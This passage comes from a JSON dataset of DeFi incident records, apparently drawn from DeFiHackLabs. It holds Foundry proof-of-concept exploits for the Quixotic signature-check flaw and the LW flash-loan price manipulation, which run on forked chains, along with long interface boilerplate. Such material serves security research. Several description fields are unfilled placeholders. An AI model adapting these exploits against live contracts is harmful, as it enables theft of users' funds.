(who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "2d09d62878",
        "is_ready": false,
        "content": "### 20220701 Quixotic - Optimism NFT Marketplace\n#### Lost: $100K\nfillSellOrder function only check seller signature.\nECDSA signature combined with v r s, if recoveredAddress == sellOrder.seller; sellorder execute.\n#### Contract\n[Quixotic_exp.sol](src/test/Quixotic_exp.sol)\n#### Link reference\nhttps://twitter.com/1nf0s3cpt/status/1542808565349777408\nhttps://twitter.com/SlowMist_Team/status/1542795627603857409\nhttps://optimistic.etherscan.io/tx/0x5dc519726e1236eb846271f6699e03cdd1a8fd593a2900c71cd2aabbdb7c92e6",
        "date": "20220701",
        "target": "Quixotic",
        "attack_title": "Optimism NFT Marketplace",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/1nf0s3cpt/status/1542808565349777408",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/SlowMist_Team/status/1542795627603857409",
                "content": "content of the link"
            },
            {
                "link": "https://optimistic.etherscan.io/tx/0x5dc519726e1236eb846271f6699e03cdd1a8fd593a2900c71cd2aabbdb7c92e6",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Quixotic_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\ninterface Quixotic {\n  function fillSellOrder(address seller,\n    address contractAddress,\n    uint256 tokenId,\n    uint256 startTime,\n    uint256 expiration,\n    uint256 price,\n    uint256 quantity,\n    uint256 createdAtBlockNumber,\n    address paymentERC20,\n    bytes memory signature,\n    address buyer) external payable;\n}\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IERC20 op = IERC20(0x4200000000000000000000000000000000000042);\n  Quixotic quixotic = Quixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  function setUp() public {\n    cheats.createSelectFork(\"optimism\", 13591383); //fork optimism at block 13591383\n  }\n  function testExploit() public {\n    cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);\n    emit log_named_uint(\"Before exploiting, attacker OP Balance:\",\n      op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5));\n    quixotic.fillSellOrder(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,\n      0xbe81eabDBD437CbA43E4c1c330C63022772C2520,\n      1,\n      0,\n      115792089237316195423570985008687907853269984665640564039457584007913129639934,\n      2736191871050436050944,\n      1,\n      115792089237316195423570985008687907853269984665640564039457584007913129639934,\n      0x4200000000000000000000000000000000000042,\n      hex\"28bc2ff1634b13821eac466ef6875c44f1f556d00d3cafce02da07b217da395131294339d96a01922b83f8e3c67e74652198b3a6db79d7ddd48807b9ec6ae0491c\",\n      0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B);\n    emit log_named_uint(\"After exploiting, attacker OP Balance:\",\n      op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5));\n    //issues was only check seller signature\n    //require(_validateSellerSignature(sellOrder, signature),\n  }\n  receive() external payable {}\n}",
                "token_count": 703,
                "interfaces": [
                    {
                        "name": "Quixotic",
                        "content": "interface Quixotic {\n  function fillSellOrder(\n    address seller,\n    address contractAddress,\n    uint256 tokenId,\n    uint256 startTime,\n    uint256 expiration,\n    uint256 price,\n    uint256 quantity,\n    uint256 createdAtBlockNumber,\n    address paymentERC20,\n    bytes memory signature,\n    address buyer\n  ) external payable;\n}\n",
                        "token_count": 73,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "a3675dc593",
        "is_ready": false,
        "content": "### 20230512 LW - FlashLoan Price Manipulation\n### Lost: ~$50k\n#### Contract\n[LW_exp.sol](src/test/LW_exp.sol)\n#### Link Reference\nhttps://twitter.com/PeckShieldAlert/status/1656850634312925184\nhttps://twitter.com/hexagate_/status/1657051084131639296",
        "date": "20230512",
        "target": "LW",
        "attack_title": "FlashLoan Price Manipulation",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/PeckShieldAlert/status/1656850634312925184",
                "content": "content of the link"
            },
            {
                "link": "https://twitter.com/hexagate_/status/1657051084131639296",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/LW_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @KeyInfo - Total Lost : ~50K US$\n// Attacker : https://bscscan.com/address/0x4404de29913e0fd055190e680771a016777973e5\n// Attack Contract : https://bscscan.com/address/0xa4fbc2c95ac4240277313bf3f810c54309dfcd6c\n// Vulnerable Contract : https://bscscan.com/address/0x7b8c378df8650373d82ceb1085a18fe34031784f\n// @Info\n// @Analysis\n// Post-mortem : https://www.google.com/\n// Twitter Guy : https://twitter.com/PeckShieldAlert/status/1656850634312925184\n// Twitter Guy : https://twitter.com/hexagate_/status/1657051084131639296\n// Hacking God : https://www.google.com/\ninterface ILW is IERC20 {\n    function getTokenPrice() external view returns (uint256);\n    function thanPrice() external view returns (uint256);\n}\ncontract ContractTest is Test {\n    ILW LW = ILW(payable(0x7B8C378df8650373d82CeB1085a18FE34031784F));\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\n    Uni_Pair_V2 LP = Uni_Pair_V2(0x6D2D124acFe01c2D2aDb438E37561a0269C6eaBB);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address marketAddr = 0xae2f168900D5bb38171B01c2323069E5FD6b57B9;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_133_285);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(LW), \"LW\");\n        cheats.label(address(LP), \"LP\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(marketAddr), \"marketAddr\");\n    }\n    function testExploit() public {\n        Pair.swap(1_000_000 * 1e18, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals());\n    }\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        USDTToLW();\n        while (USDT.balanceOf(marketAddr) > 3000 * 1e18) {\n            LW.thanPrice();\n            uint256 transferAmount = 2510e18 * 1e18 / LW.getTokenPrice();\n            LW.transfer(address(LP), transferAmount);\n            LW.thanPrice();\n            LP.skim(address(this));\n            payable(address(LW)).call{value: 1}(\"\"); // Trigger the swap 3000e18 USDT to LW in the receive function\n        }\n        LWToUSDT();\n        USDT.transfer(address(Pair), 1_002_507 * 1e18);\n    }\n    function USDTToLW() internal {\n        USDT.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(LW);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n    function LWToUSDT() internal {\n        LW.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LW);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(LW.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n}",
                "token_count": 1023,
                "interfaces": [
                    {
                        "name": "ILW",
                        "content": "interface ILW is IERC20 {\n    function getTokenPrice() external view returns (uint256);\n    function thanPrice() external view returns (uint256);\n}\n",
                        "token_count": 33,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
